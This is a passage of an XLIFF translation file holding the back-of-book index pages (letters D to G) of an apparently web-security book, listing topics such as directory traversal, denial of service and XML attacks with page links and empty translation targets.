        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html" style="font-weight:bold;"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch10lev1sec4.html#iddle1191"&gt; data validation, XML&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1192"&gt; database connection strings&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1193"&gt; databases&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1194"&gt; delivery.php&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch01lev1sec6.html#iddle1195"&gt; denial of service&lt;/a&gt;&lt;a class="v2" href="ch07lev1sec2.html#iddle1196"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1197"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1198"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1199"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec9.html#iddle1200"&gt; digital signatures on ActiveX controls&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1201"&gt; direct request, sendmessage.php&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1202"&gt; directing output to other files or programs&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch05lev1sec2.html#iddle1203"&gt; directory traversal&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1204"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1205"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch05lev1sec2.html#iddle1206"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1207"&gt; documents, numbering&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1208"&gt; DOM (Document Object Model)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1209"&gt; DOM inspector, Firefox&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec2.html#iddle1210"&gt; Domain Name System (DNS)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1211"&gt; DOS (denial of service)&lt;/a&gt;&lt;a class="v2" href="ch07lev1sec2.html#iddle1212"&gt; 2nd&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1213"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1214"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1215"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1216"&gt; dot-com boom&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec3.html#iddle1217"&gt; dot-coms&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1218"&gt; double URL encoding&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec5.html#iddle1219"&gt; DoubleClick.net&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1220"&gt; dumb terminals&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=C.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=E.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=D.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html" style="font-weight:bold;"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch02lev1sec2.html#iddle1221"&gt; e-mail addresses&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1222"&gt; validating&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec1.html#iddle1223"&gt; Eckert, Presper&lt;/a&gt;&lt;br /&gt;encoding&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1224"&gt; characters&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch06lev1sec2.html#iddle1225"&gt; double URL encoding&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1226"&gt; encryption&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec1.html#iddle1227"&gt; ENIAC&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1228"&gt; equal sign (=)&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec6.html#iddle1229"&gt; Ericsson Medta Lab&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1230"&gt; error code&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1231"&gt; error messages&lt;/a&gt;&lt;a class="v2" href="ch02lev1sec2.html#iddle1232"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1233"&gt; Ethereal, cipher suite&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1234"&gt; events, triggering scripts&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1235"&gt; EXEC&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec3.html#iddle1236"&gt; eXtensible Markup Language (XML)&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1237"&gt; buffer overflow attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1238"&gt; data validation&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1239"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch10lev1sec4.html#iddle1240"&gt; recursive payload attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch10lev1sec4.html#iddle1241"&gt; external entity attacks&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec6.html#iddle1242"&gt; extreme programming methods&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=D.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=F.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=E.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html" style="font-weight:bold;"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=U.html"&gt;U&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=V.html"&gt;V&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=W.html"&gt;W&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=X.html"&gt;X&lt;/a&gt;]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.text">
          <source>failure of Web development community</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch08lev1sec2.html#iddle1244"&gt; fake cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1245"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1246"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1247"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1248"&gt; false negatives&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch01lev1sec5.html#iddle1249"&gt; fat clients&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch07lev1sec2.html#iddle1250"&gt; fields&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch03lev1sec2.html#iddle1251"&gt; hidden fields&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch06lev1sec2.html#iddle1252"&gt; filenames, buffer overflows&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1253"&gt; files, naming conventions&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch05lev1sec2.html#iddle1254"&gt; filtering out code&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch09lev1sec2.html#iddle1255"&gt; financial information&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch02lev1sec2.html#iddle1256"&gt; finding sub-sites&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch07lev1sec2.html#iddle1257"&gt; fingerprinting the server&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1258"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1259"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch07lev1sec2.html#iddle1260"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1261"&gt; Firefox, DOM inspector&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app02.html#iddle1262"&gt; forceful browsing, delivery.php&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&lt;a class="v2" href="ch08lev1sec2.html#iddle1263"&gt; forcing weak cryptography&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1264"&gt; applying this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1265"&gt; conducting this attack&lt;/a&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a class="v2" href="ch08lev1sec2.html#iddle1266"&gt; protecting against this attack&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1267"&gt; form fields&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch08lev1sec2.html#iddle1268"&gt; form-based authentication&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="app01lev1sec4.html#iddle1269"&gt; formal methods&lt;/a&gt;&lt;a class="v2" href="app01lev1sec6.html#iddle1270"&gt; 2nd&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch04lev1sec2.html#iddle1271"&gt; forms&lt;/a&gt;&lt;br /&gt; &lt;a class="v2" href="ch03lev1sec2.html#iddle1272"&gt; free-range input&lt;/a&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=E.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="index&amp;view=G.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="index&amp;amp;view=F.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
					&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Index</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>[&lt;a class="v1" href="index&amp;amp;view=SYMBOL.html"&gt;SYMBOL&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=A.html"&gt;A&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=B.html"&gt;B&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=C.html"&gt;C&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=D.html"&gt;D&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=E.html"&gt;E&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=F.html"&gt;F&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=G.html" style="font-weight:bold;"&gt;G&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=H.html"&gt;H&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=I.html"&gt;I&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=K.html"&gt;K&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=L.html"&gt;L&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=M.html"&gt;M&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=N.html"&gt;N&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=O.html"&gt;O&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=P.html"&gt;P&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=Q.html"&gt;Q&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=R.html"&gt;R&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=S.html"&gt;S&lt;/a&gt;]
									
										[&lt;a class="v1" href="index&amp;amp;view=T.html"&gt;T&lt;/a&gt;]
									
